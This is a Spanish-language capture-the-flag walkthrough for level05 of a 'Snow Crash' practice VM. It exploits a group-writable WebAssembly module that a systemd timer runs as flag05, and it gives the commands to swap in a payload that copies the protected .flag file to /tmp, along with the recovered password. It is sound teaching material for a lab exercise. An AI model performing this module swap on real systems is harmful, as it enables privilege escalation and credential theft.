# Level05 - Snow Crash

## Tipo de ejercicio

Reemplazo temporal de un módulo WebAssembly escribible por un grupo de
usuarios y ejecución privilegiada del módulo mediante un servicio `systemd`.

## Objetivo

Encontrar la credencial que permite conectarse al usuario `level06`.

El mecanismo real es un runtime WebAssembly llamado
`metaverse`.

## 1. Identificar el componente del nivel

Desde la sesión SSH de `level05`:

```bash
whoami
hostname
pwd
ls -la
cat README
```

El README contiene la pista:

```text
The Metaverse runs on code. Code can be rewritten.
```

Los archivos propios de los niveles de la OVA se encuentran bajo
`/opt/snowcrash`. `/opt` se utiliza habitualmente para software adicional
instalado fuera de los directorios básicos del sistema. Por eso examinamos el
directorio correspondiente a este nivel:

```bash
ls -la /opt/snowcrash/level05
file /opt/snowcrash/level05/*
```

Resultado relevante:

```text
/opt/snowcrash/level05/metaverse.wasm: WebAssembly (wasm) binary module
/opt/snowcrash/level05/metaverse.wat:  ASCII text
```

`file` solo identifica el tipo de cada archivo. Para leer el contenido del
módulo textual ejecutamos:

```bash
cat /opt/snowcrash/level05/metaverse.wat
```

La salida permite comprobar que `metaverse.wat` es la representación textual
del módulo WebAssembly que se ejecuta como
`/opt/snowcrash/level05/metaverse.wasm`. Solo muestra el mensaje `Signal
integrity: 91%` y no contiene la credencial.

## 2. Analizar el servicio

El módulo `metaverse.wasm` no se ejecuta solo: algo tiene que lanzarlo. En
sistemas con `systemd` esa tarea suele recaer en un servicio, así que buscamos
si existe alguno relacionado con el nombre del nivel (`metaverse`):

```bash
systemctl list-units --type=service --all | grep -i metaverse
```

`--all` incluye también las unidades inactivas (un servicio `oneshot` termina
tras ejecutarse y no aparecería de otro modo) y `grep -i` filtra por nombre sin
distinguir mayúsculas. Resultado:

```text
metaverse.service    loaded    inactive    dead    Metaverse WASM runtime (one-shot)
```

Aparece `metaverse.service`, inactivo porque ya terminó su ejecución. Como un
servicio `oneshot` inactivo debe ser lanzado periódicamente por algo, buscamos
si hay un temporizador asociado:

```bash
systemctl list-timers --all | grep -i metaverse
ls /etc/systemd/system | grep -i metaverse
```

Esto revela que existe `metaverse.timer`. El `ls` lista el directorio donde
`systemd` guarda las unidades definidas por el administrador y, filtrado por
`metaverse`, confirma que ambos archivos (`metaverse.service` y
`metaverse.timer`) están presentes. Ya podemos inspeccionar su configuración y
el estado del servicio:

```bash
cat /etc/systemd/system/metaverse.service
cat /etc/systemd/system/metaverse.timer
systemctl status metaverse.service --no-pager
```

El primer `cat` permite leer cómo se ejecuta el servicio; el segundo muestra
cuándo se activa el temporizador.
`systemctl status` confirma el estado actual del servicio y muestra posibles
errores recientes sin abrir un paginador.

La configuración relevante es:

```ini
[Service]
Type=oneshot
User=flag05
ExecStart=/usr/local/bin/wasmtime --dir=/ /opt/snowcrash/level05/metaverse.wasm
```

La salida de `metaverse.service` muestra que el servicio utiliza
`/usr/local/bin/wasmtime`; no es una herramienta elegida al azar. Podemos
comprobar que el ejecutable existe con:

```bash
ls -l /usr/local/bin/wasmtime
file /usr/local/bin/wasmtime
```

`ExecStart` indica el comando que ejecuta el servicio. `wasmtime` es el runtime
que carga el módulo WebAssembly; `--dir=/` permite al módulo acceder al sistema
de archivos de la OVA, y la última ruta indica qué módulo se ejecuta. Como la
unidad define `User=flag05`, el módulo se ejecuta con los permisos de ese
usuario.

El temporizador ejecuta el módulo aproximadamente cada 30 segundos:

```ini
OnUnitActiveSec=30s
```

Con `systemctl status metaverse.service --no-pager` vemos el estado actual del
servicio (`inactive (dead)` tras su última ejecución, al ser de tipo
`oneshot`), si terminó correctamente (`Main PID` y código de salida) y las
últimas líneas de su log, útiles para detectar errores recientes sin tener que
abrir un paginador.

## 3. Confirmar la vulnerabilidad de permisos

```bash
id
ls -l /opt/snowcrash/level05/metaverse.wasm
```

`id` muestra el usuario actual y sus grupos; aquí comprobamos que `level05`
pertenece al grupo `metaverse`.

Resultado relevante:

```text
uid=1006(level05) ... groups=...,986(metaverse),...
-rw-rw-r-- 1 root metaverse ... metaverse.wasm
```

`level05` pertenece al grupo `metaverse`, que tiene permisos de escritura
sobre el módulo que ejecutará el servicio como `flag05`. Este es el camino de
explotación previsto por la OVA.


## 4. Preparar el módulo de explotación

Antes de escribir el módulo, comprobamos el directorio personal del usuario
con el que se ejecuta el servicio:

```bash
getent passwd flag05
ls -la /home/flag05
```

`getent passwd flag05` busca la cuenta `flag05` en la base de usuarios del
sistema y muestra, entre otros datos, su directorio personal. Es una forma
estándar de consultar esa información, equivalente en este caso a buscar la
cuenta en `/etc/passwd`.
`ls -la` intenta listar ese directorio, incluidos los archivos ocultos. En
este caso puede mostrar `Permission denied`, porque `level05` no tiene permiso
para listar el directorio de `flag05`; ese error es esperado.

La entrada de `flag05` confirma que su directorio personal es
`/home/flag05`. La OVA utiliza `.flag` como nombre del archivo que contiene la
credencial, pero `level05` no puede comprobarlo directamente. El módulo se
ejecutará después como `flag05` y podrá leerlo. La ruta de salida no se
descubre: la elegimos nosotros dentro de `/tmp`, que es escribible, para poder
leer el resultado después.

El módulo original solo muestra el mensaje de integridad y no contiene ninguna
operación para leer `.flag`. Como `level05` puede escribir el módulo que el
servicio ejecuta como `flag05`, creamos en el equipo anfitrión un módulo WAT
alternativo para realizar esa lectura.

El código fuente creado para esta resolución está disponible en
[metaverse-exploit.wat](metaverse-exploit.wat). Importa las funciones WASI
`path_open`, `fd_read` y `fd_write`: abre `/home/flag05/.flag`, lee su
contenido y lo guarda en `/tmp/level05_flag.txt`. No es un archivo original de
la OVA; es el módulo de reemplazo que construimos para aprovechar la
vulnerabilidad identificada en el punto 3.

El archivo `metaverse-exploit.wat` está en el repositorio del equipo
anfitrión. La OVA no puede leerlo directamente, así que primero se sale de la
sesión SSH:

```bash
exit
```

En el terminal del equipo anfitrión, situado en la raíz del repositorio,
ejecutamos `scp` para copiar el archivo `.wat` a `/tmp` de la OVA. Después se
volverá a entrar en la OVA para convertir ese archivo en el binario `.wasm` que
se utilizará para reemplazar temporalmente el módulo original:

```bash
scp -P 2424 level05/resources/metaverse-exploit.wat \
	level05@localhost:/tmp/metaverse-exploit.wat
```

Si la transferencia termina correctamente, `scp` muestra el nombre del
archivo y una línea con `100%`. El tamaño y la velocidad pueden variar; el
`100%` confirma que el archivo llegó a `/tmp` de la OVA.

Después se vuelve a entrar en la OVA:

```bash
ssh level05@localhost -p 2424
```

Ya en la sesión `level05@snowcrash`, comprobamos que la herramienta de
compilación está disponible:

```bash
command -v wat2wasm
```

Si el comando muestra una ruta, compilamos el módulo:

```bash
wat2wasm /tmp/metaverse-exploit.wat -o /tmp/metaverse-exploit.wasm
```

`wat2wasm` compila el código WebAssembly en formato texto (`.wat`) y genera
el módulo binario (`.wasm`) que `wasmtime` puede cargar y ejecutar. El archivo
original se conserva y el resultado compilado se guarda en `/tmp` para usarlo
en el reemplazo temporal. Si `command -v` no muestra ninguna ruta,
`wat2wasm` no está instalado y no se debe continuar con los comandos `cp`.

Antes de reemplazar el módulo, se guarda una copia temporal del original:

```bash
cp /opt/snowcrash/level05/metaverse.wasm /tmp/metaverse-original.wasm
cp /tmp/metaverse-exploit.wasm /opt/snowcrash/level05/metaverse.wasm
```

La copia sustituye el módulo que utilizará el servicio, pero no lo ejecuta en
ese momento. Hay que esperar a la siguiente activación de
`metaverse.timer` (aproximadamente 30 segundos) para que `wasmtime` cargue el
módulo como `flag05` y cree `/tmp/level05_flag.txt`.

## 5. Obtener la credencial

Después de esperar al siguiente ciclo, comprobamos que el servicio terminó y
que el archivo fue creado:

```bash
systemctl status metaverse.service --no-pager
ls -l /tmp/level05_flag.txt
cat /tmp/level05_flag.txt
```

`systemctl status` comprueba cómo terminó la última ejecución del servicio; no
lo inicia de nuevo. Debe mostrar que no terminó en estado `failed`.
`ls -l` comprueba que el módulo creó `/tmp/level05_flag.txt` y muestra sus
permisos, propietario y tamaño. Por último,
`cat` lee el contenido del archivo, que es la credencial obtenida.

El resultado fue:

```text
viuaaale9huek52boumoomioc
```

## 6. Restaurar el servidor

Una vez recuperada la credencial, se restaura el módulo original:

```bash
cp /tmp/metaverse-original.wasm /opt/snowcrash/level05/metaverse.wasm
```

Los artefactos temporales se pueden eliminar después:

```bash
rm -f /tmp/metaverse-original.wasm \
			/tmp/metaverse-exploit.wasm \
			/tmp/metaverse-exploit.wat
```

## 7. Conectarse a level06

Desde el equipo anfitrión:

```bash
exit
ssh level06@localhost -p 2424
```

Cuando SSH solicite la contraseña, introducir:

```text
viuaaale9huek52boumoomioc
```

## Conclusión

El servicio `metaverse` ejecuta un módulo WebAssembly como `flag05`. La
pertenencia de `level05` al grupo `metaverse` permite escribir temporalmente
el módulo. El payload WASI lee el archivo protegido `.flag`, recupera la
credencial de `level06` y después se restaura el módulo original.
